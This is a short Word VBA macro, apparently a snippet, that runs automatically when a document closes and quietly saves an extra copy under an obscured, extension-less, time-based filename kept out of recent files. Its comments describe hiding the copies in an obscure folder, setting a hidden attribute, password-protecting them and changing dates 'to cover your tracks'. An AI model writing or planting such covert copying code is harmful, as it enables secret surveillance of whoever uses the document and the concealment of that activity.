Private Sub Document_Close()

    Application.Dialogs(wdDialogFileSaveAs).Show
    
    ActiveDocument.SaveAs2 FileName:="C:\Users\User\Documents\" _
                & "processing saving " _
                & Format(Time, "s.m.h") _
                & "." & Format(Date, "m.d"), _
    FileFormat:=wdFormatDocumentDefault, _
    AddToRecentFiles:=False
    'WritePassword:=strPWD
    'obscure the filename and enable password. But make sure you'll be able to read it
    'save to a hidden folder somewhere obscure
    'the date is not really important in the file name, as it's the same in the parameters
    'change date when putting that script on, then change it again, to cover your tracks
    '                & ".doc",
    'no file extension as an extra protection, you'll add it yourself when opening the files
    'date obfuscated on purpose
    'TODO: try to have that file saved with attribute hidden
End Sub
